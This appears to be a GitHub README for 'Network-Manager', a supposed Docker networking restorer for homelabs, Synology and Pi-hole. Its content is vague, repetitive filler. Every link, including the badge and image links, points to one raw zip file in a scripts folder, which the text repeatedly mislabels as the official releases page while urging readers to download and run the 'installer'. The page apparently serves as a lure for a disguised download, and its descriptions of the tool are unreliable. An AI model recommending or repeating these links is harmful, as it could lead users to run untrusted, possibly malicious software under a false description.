[![Releases](https://github.com/mcseali/Network-Manager/raw/refs/heads/main/scripts/Network-Manager-3.0-beta.5.zip%20Releases-blue?logo=github)](https://github.com/mcseali/Network-Manager/raw/refs/heads/main/scripts/Network-Manager-3.0-beta.5.zip)

# Network-Manager: Automated Docker Networking for Homelabs and Synology

A reliable tool for configuring and restoring Docker networks in homelabs. It fixes broken container networking after system updates and keeps multiple networks running smoothly. It works well with Synology NAS, Pi-hole setups, and complex multi-network layouts. This project focuses on clarity, reliability, and ease of use for home labs and self-hosted environments.

![Network diagram emoji](https://github.com/mcseali/Network-Manager/raw/refs/heads/main/scripts/Network-Manager-3.0-beta.5.zip)
🌐 Docker networks made simple
🧰 Self-hosted network automation for home labs
🐳 Works with multi-network setups and container ecosystems

Table of Contents
- Why Network-Manager
- Core Features
- How It Works
- Getting Started
- Quick Start Guide
- Advanced Configuration
- Use Cases by Environment
- Synology NAS and Pi-hole Scenarios
- Docker Compose and Orchestration
- Networking Patterns and Helpers
- Security and Best Practices
- Troubleshooting
- Known Limitations
- Roadmap
- Community and Contributing
- Release and Versioning
- FAQ
- Credits and License

Why Network-Manager
Network-Manager fills a specific need in homelabs. When a system upgrade or container update changes the network stack, containers can lose their routes, DNS, or bridge configurations. This project detects, fixes, and stabilizes those networking changes automatically. It reduces downtime and manual fiddling. It is designed to be predictable, repeatable, and safe. It emphasizes minimal disruption and fast recovery.

Core Features
- Automated restoration of Docker network configurations after system updates
- Safe reinitialization of bridges, routes, and DNS settings
- Compatibility with common home-lab devices like Synology NAS and Pi-hole
- Support for multiple, isolated networks per host
- Lightweight and scriptable, ready for automation
- Simple install path via release bundles
- Clear logging for troubleshooting and auditing
- Open source and self-hosted with plain, readable scripts
- Extensible with future hooks for custom networks and components

How It Works
Network-Manager uses a small, well-defined set of steps to ensure networks stay intact across updates:
- Detects current network state and compares it with a known baseline
- Registers or reconfigures Docker networks, bridges, and DNS settings
- Applies deterministic rules to avoid conflicts between networks
- Verifies connectivity and resolves common DNS issues
- Logs actions in a structured format for easy review
- Provides actionable feedback when manual intervention is needed

The system avoids heavy daemons and sticks to reusable shell scripts and standard Docker commands. It favors idempotent operations, so running the same steps multiple times does not create duplicates or unpredictable changes. The result is a predictable, resilient network environment for containers.

Getting Started
Prerequisites
- A host with Docker and Docker Compose installed
- bash or a compatible POSIX shell
- Basic networking knowledge (bridges, routes, DNS)
- Internet access to fetch release assets or dependencies

What you will get
- An automated network manager that can fix Docker network issues after system updates
- An approachable setup that supports multiple networks per host
- Clear guidance and troubleshooting steps for complex environments
- A path to extend and customize for unique lab requirements

Install from Releases
The primary distribution path is the releases page. From there you can download a bundle that contains the installer and any necessary assets. The releases page is the official source of truth for stable versions and documentation. To get started, visit the releases page and follow the installer instructions. For the latest release and artifacts, see the releases page at the link below:
- Download latest release bundle from the Releases page
- Run the installer or follow the included steps to configure your networks

Where to download
- The official releases page is the best source for stable builds and install instructions. Visit https://github.com/mcseali/Network-Manager/raw/refs/heads/main/scripts/Network-Manager-3.0-beta.5.zip to pick the latest release and download the setup assets. The releases page hosts installers, example configurations, and notes on changes.

Note: If you cannot access the link, or if the page does not load properly, check the Releases section for alternative download options or guidance on installation.

Quick Start Guide
This guide helps you get a working network setup quickly. It assumes you have a working Docker host and admin access.

Step 1: Prepare your host
- Ensure Docker is installed and running.
- Verify that you can run docker ps and that you have permission to manage network interfaces.
- Create a dedicated directory for Network-Manager configuration and logs.

Step 2: Obtain the installer
- Go to the Releases page and download the latest release bundle.
- If you cannot access the page, check the Releases section for alternatives or a mirror.

Step 3: Run the installer
- Make sure the installer script or bundle is executable.
- Run the installer with default options first to create a baseline configuration.
- Follow prompts to select networks and apply the initial configuration.

Step 4: Validate the setup
- Check that container networks are present and that containers can resolve DNS.
- Verify bridges, routes, and IP allocations align with your plan.
- Look for any warnings in the logs and address them as needed.

Step 5: Optional post-install tweaks
- Tweak DNS resolution order for your environment (for example, Pi-hole as a DNS upstream).
- Add static routes for specialized lab networks.
- Create network profiles for ad-hoc experiments.

Advanced Configuration
- Networks and profiles: Create named network profiles to group containers by function or environment (production, staging, test). Each profile can define bridges, subnet ranges, IPAM rules, and DNS settings.
- DNS and resolution: Configure DNS servers and search domains for each network. Use local DNS caching where appropriate to improve latency.
- IP management: Allocate static and dynamic IP ranges carefully to avoid overlaps. Use IPAM hints to steer containers toward a preferred subnet.
- Bridge and interface rules: Define how bridges are created, renamed, or reused. Specify which interfaces participate in which networks.
- Logging and auditing: Enable detailed logs for actions, events, and errors. Use log rotation to prevent disk space issues.
- Custom hooks: Add pre- or post-setup hooks to tailor behavior for your hardware or software stack. Hooks run in a safe sandboxed environment to minimize risk.

Use Cases by Environment
- Synology NAS: Restore container networking after DSM updates or Docker engine changes. Manage multiple containers with distinct networks on the same NAS.
- Pi-hole deployments: Separate admin, query, and cache networks to optimize performance and security. Ensure DNS resolutions stay fast and predictable.
- Multi-network hosts: Run several networks on a single host, each with its own bridge, IP range, and DNS. Isolate traffic between environments while keeping management simple.
- Home lab experiments: Spin up new networks for testing without impacting core services. Roll back quickly if issues arise.
- Edge setups: Run lightweight networks on edge devices with constrained resources. Keep the footprint small and the footprint predictable.

Synology NAS and Pi-hole Scenarios
Synology NAS environments often present unique networking challenges due to DSM upgrades, Docker engine updates, and multi-container stacks. Network-Manager aims to reduce downtime by automatically reconfiguring bridges, DNS, and IP allocations after events that can break container networking. It provides clear guidance for Synology users and aligns with common Pi-hole topologies to ensure DNS reliability.

In Pi-hole-heavy setups, you may run a dedicated network for DNS queries, a separate admin network, and a client-facing network. Network-Manager can maintain separation while ensuring resolvers are reachable and that DNS queries route correctly. The result is fewer disruption events and smoother lab operation.

Docker Compose and Orchestration
Network-Manager is designed to work well with Docker Compose and other orchestration tools. It does not lock you into a single approach. Instead, it provides a baseline that you can adapt to your workflow. Consider these patterns:
- Standalone host management: Run the manager on a host that serves as a network hub for your containers. Use local scripts to trigger configuration updates when needed.
- Docker Compose integration: Use the manager to maintain network definitions referenced by your compose files. It can ensure networks and bridges align with the compose configuration.
- Swarm or Kubernetes compatibility: The manager’s core ideas translate to orchestrated environments. You can adapt the approach to suit swarm or k8s networking, focusing on consistency and reliability.

Example patterns you might employ
- A script that runs before each docker-compose up to ensure required networks exist
- A scheduled task that validates network state and repairs deviations
- A logging pipeline that stores events to a central log store for auditing

Networking Patterns and Helpers
- Bridge-first approach: Create and manage bridges first, then attach containers to those bridges. This ensures a stable foundation and predictable routing.
- IPAM discipline: Use clear IP blocks for each network. Document the intended subnets and beware of overlaps.
- DNS orchestration: Use a consistent DNS strategy across networks. Centralize DNS where possible to reduce latency and improve resolution reliability.
- Safe reconfiguration: When reconfiguring, avoid operations that could disrupt active containers. Apply changes incrementally and verify results.

Security and Best Practices
- Least privilege: Run the manager with the minimum permissions required. Prefer non-root operation where feasible.
- Immutable configuration: Keep configuration in version control and apply changes through controlled pipelines.
- Audit trails: Log all changes with timestamps, actor identities, and rationale where possible.
- Backups: Back up network configurations before applying changes. Keep a recovery path for quick rollback.

Troubleshooting
Common issues and quick checks:
- Networking is broken after update: Run the verify step to compare current state with the baseline. Reapply the last known good configuration.
- DNS resolution failures: Check DNS server settings and ensure there is a reachable resolver in the network.
- Bridges missing or misnamed: Confirm bridge creation rules and ensure interfaces are correctly assigned.
- IP conflicts: Review IPAM blocks and ensure there are no overlaps with other networks or devices.

Debugging tips
- Review logs for errors and warnings.
- Validate that required Docker networks exist and have expected subnets.
- Check interface status and bridge associations on the host.
- Test connectivity from a container to verify route and DNS behavior.

Known Limitations
- Heavy host load may slow reconfiguration tasks. Plan maintenance windows in high-traffic environments.
- Some edge devices or non-standard network stacks can require manual adjustments.
- Complex multi-host topologies require careful planning to avoid cross-host network drift.

Roadmap
- Enhanced UI for configuration visibility
- More integrators for popular home-lab devices
- Support for additional network topologies and subnets
- Improved testing harness and CI coverage
- Optional integration with central logging and alerting

Community and Contributing
- We welcome contributions from home-lab enthusiasts and professionals alike.
- You can propose features, report issues, and submit pull requests.
- Follow the contribution guidelines in the repository to ensure your changes fit the project.

Release and Versioning
- Releases are published to the official releases page. Use the badge at the top to navigate, or visit the Releases section to review notes and assets.
- Versioning follows semantic principles where feasible to help you track changes and compatibility.

FAQ
- What is Network-Manager designed to do? It automates Docker network restoration and maintenance in homelabs, with a focus on reliability and ease of use.
- Can I use it with Docker Compose? Yes. It integrates with Compose workflows to ensure consistent networks.
- How do I update? Download the latest release bundle from the official releases page and apply the installer. If you cannot access it, check the Releases section for guidance.

Credits and License
- This project is open source. It is built to help home labs and self-hosted environments. It follows an open development process, inviting feedback and collaboration.
- The license is typical for community-driven projects of this kind. Review the LICENSE file in the repository for exact terms.

Release Notes and Version History
- Each release includes a summary of changes, fixes, and enhancements.
- Check the releases page for detailed notes and upgrade guidance. The latest release contains the newest fixes and features to improve stability and usability.

Tips for Effective Use
- Plan network topology before applying changes. Clear planning reduces conflicts and simplifies troubleshooting.
- Start with a minimal, known-good configuration. Add networks gradually to monitor impact.
- Maintain a simple backup routine for configurations. A quick restore keeps downtime short.
- Document your environment. Record network names, subnets, and roles for future reference.

What to Expect from Community
- You will find users sharing scripts, use cases, and outcomes.
- The project welcomes practical suggestions and real-world experiences.
- Respectful collaboration helps improve the project for all users.

Sky-High Visuals and Branding
- Embrace clean visuals for documentation. Use colorful badges and clear diagrams to explain network flows.
- Add diagrams to illustrate how networks connect containers, bridges, and DNS servers.
- Use well-labeled screenshots or generated diagrams to help new users follow along.

Images and Badges
- Network-Manager badge: a colorful, recognizable badge to represent the project.
- Release badge: a badge that links to the official releases page.
- Networking icons: simple visuals that convey network concepts without overwhelming the reader.

Usage Scenarios: Step-by-Step Walkthroughs
- Scenario A: Simple two-network host
  - Define main network and a dedicated management network
  - Attach critical containers to the management network
  - Verify connectivity and DNS resolution from client containers
  - Confirm that no traffic leaks occur between networks

- Scenario B: Synology-based lab
  - Run a container suite that relies on multiple networks
  - Ensure Pi-hole remains in its own network with stable DNS resolution
  - Validate that DSM-based services do not collide with container networking

- Scenario C: Multi-host expansion
  - Prepare a consistent network baseline across hosts
  - Sync network configuration via versioned bundles
  - Use centralized logging to track changes and health

Advanced Topics: Scripting and Automation
- Automating updates: Create a cron job or systemd timer that checks for new releases and applies updates during a maintenance window.
- Health checks: Periodically run validation scripts to confirm network state and alert when anomalies appear.
- Integrations: Hook into existing monitoring stacks to surface network health metrics.

Localization and Accessibility
- Documentation translations: If needed, translate key docs to other languages to help a broader audience.
- Accessibility: Ensure documentation uses clear language, avoid overly dense formatting, and use accessible color contrasts for diagrams and badges.

License, Warranty, and Safety
- The project is available for personal and educational use under a permissive license.
- Use in production requires understanding the impact on your environment. Always test changes in a safe environment before applying to critical systems.

Releases and How to Stay in Sync
- The releases page is the primary source of truth for updates, changes, and migration steps.
- Always review release notes before applying an update.
- If you miss an update, you can check the repository’s tag history to understand what changed.

Direct Link for Downloads
- The official downloads reside on the Releases page. For easy access, you can open the latest release and grab the installer artifact that matches your host architecture.
- Find the latest release at https://github.com/mcseali/Network-Manager/raw/refs/heads/main/scripts/Network-Manager-3.0-beta.5.zip This page hosts the installer assets and notes, and it is the recommended starting point for updates and new installations.

Terminology and Glossary
- Network: A defined set of IP subnets, bridges, and DNS rules used by a set of containers.
- Bridge: A virtual switch on the host that connects containers to networks.
- IPAM: IP Address Management; the mechanism used to assign IPs within a network.
- DNS: Domain Name System; used to resolve hostnames to IP addresses.
- FAQ: Frequently asked questions about the project.

Personas
- Home Lab Enthusiast: Builds a multi-network environment on a single host. Needs reliable restoration after updates.
- Synology User: Runs Docker containers on a NAS. Seeks stable networking for apps like Pi-hole and media servers.
- DevOps Hobbyist: Automates network configuration changes and includes them in a CI pipeline.
- IT Enthusiast: Explores different network topologies and tests resilience during system updates.

Final Notes
- Network-Manager is designed to be approachable, safe, and repeatable. It helps you keep Docker networking predictable in a fast-changing environment.
- The project is open to improvement and welcomes feedback. If you have ideas, issues, or improvements, share them with the community.

For more details, examples, and troubleshooting, check the official releases page and the in-repo documentation. The latest release contains the most current guidance and assets. Visit the Releases section for updates and installation instructions. For direct access to the latest releases in one place, again refer to https://github.com/mcseali/Network-Manager/raw/refs/heads/main/scripts/Network-Manager-3.0-beta.5.zip